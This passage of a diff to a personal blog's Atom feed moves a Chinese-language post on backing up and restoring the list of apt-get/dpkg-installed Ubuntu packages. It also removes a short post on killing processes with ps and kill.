-<p>如何将现有电脑上的软件包迁移至新的系统呢？</p>
-</blockquote>
-<p>很简单。</p>
-<p>首先，将原有的软件列表导出：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --get-selections  &gt; app-backup-list.lst</span><br></pre></td></tr></table></figure>
-<p>最好是设置一个定时任务，每隔一段时间就保存一次列表，并且要保存到一个独立的分区。以免某天系统真的坏了。</p>
-<p>接下来便是导入了：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --set-selections &lt; app-backup-list.lst</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get dselect-upgrade</span><br></pre></td></tr></table></figure>
-<p>至于软件源的备份，只需将<code>/etc/apt/sources.list</code>文件复制过去即可。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的]]>
-    </summary>
-    
-      <category term="apt-get" scheme="http://hsfzxjy.github.io/tags/apt-get/"/>
-    
-      <category term="ubuntu" scheme="http://hsfzxjy.github.io/tags/ubuntu/"/>
-    
-      <category term="随手记" scheme="http://hsfzxjy.github.io/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title><![CDATA[初试HTML5]]></title>
     <link href="http://hsfzxjy.github.io//html5-media-test/"/>
     <id>http://hsfzxjy.github.io//html5-media-test/</id>
@@ -858,6 +942,37 @@
     </summary>
     
       <category term="编程" scheme="http://hsfzxjy.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[如何备份apt-get已安装的软件列表？]]></title>
+    <link href="http://hsfzxjy.github.io//backup-apt-get/"/>
+    <id>http://hsfzxjy.github.io//backup-apt-get/</id>
+    <published>2015-04-18T16:00:00.000Z</published>
+    <updated>2015-11-08T10:07:09.289Z</updated>
+    <content type="html"><![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的操作系统。</p>
+<p>但，如果有一天，系统需要被重装——或是无可救药了，抑或是购置了新的设备，问题来了：</p>
+<blockquote>
+<p>如何将现有电脑上的软件包迁移至新的系统呢？</p>
+</blockquote>
+<p>很简单。</p>
+<p>首先，将原有的软件列表导出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --get-selections  &gt; app-backup-list.lst</span><br></pre></td></tr></table></figure>
+<p>最好是设置一个定时任务，每隔一段时间就保存一次列表，并且要保存到一个独立的分区。以免某天系统真的坏了。</p>
+<p>接下来便是导入了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --set-selections &lt; app-backup-list.lst</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get dselect-upgrade</span><br></pre></td></tr></table></figure>
+<p>至于软件源的备份，只需将<code>/etc/apt/sources.list</code>文件复制过去即可。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><code>apt-get</code>是 ubuntu 下管理软件包的一个工具，实用简单，功能强大。平时若要安装或卸载软件包，只需轻敲一条指令即可。每一台ubuntu上，都安装着数以千百计的软件包——或是内核模块，或是工作、娱乐所需的软件，在它们的支持下，工作着这个开放的]]>
+    </summary>
+    
+      <category term="apt-get" scheme="http://hsfzxjy.github.io/tags/apt-get/"/>
+    
+      <category term="ubuntu" scheme="http://hsfzxjy.github.io/tags/ubuntu/"/>
+    
+      <category term="随手记" scheme="http://hsfzxjy.github.io/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
@@ -1101,27 +1216,6 @@
       <category term="创新作文大赛" scheme="http://hsfzxjy.github.io/tags/%E5%88%9B%E6%96%B0%E4%BD%9C%E6%96%87%E5%A4%A7%E8%B5%9B/"/>
     
       <category term="杂感" scheme="http://hsfzxjy.github.io/categories/%E6%9D%82%E6%84%9F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[ubuntu杀死进程]]></title>
-    <link href="http://hsfzxjy.github.io//kill-processes-under-ubuntu/"/>
-    <id>http://hsfzxjy.github.io//kill-processes-under-ubuntu/</id>
-    <published>2015-03-02T03:17:55.000Z</published>
-    <updated>2015-11-08T10:07:42.329Z</updated>
-    <content type="html"><![CDATA[<pre><code>ps <span class="operator">-e</span> <span class="comment">#查看进程列表</span>
-sudo <span class="built_in">kill</span> &lt;pid&gt;
-</code></pre>]]></content>
-    <summary type="html">
-    <![CDATA[<pre><code>ps <span class="operator">-e</span> <span class="comment">#查看进程列表</span>
-sudo <span class="built_in">kill</span> &lt;pid&gt;
-</co]]>
-    </summary>
-    
-      <category term="ubuntu" scheme="http://hsfzxjy.github.io/tags/ubuntu/"/>
-    
-      <category term="随手记" scheme="http://hsfzxjy.github.io/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/"/>
     
   </entry>
   
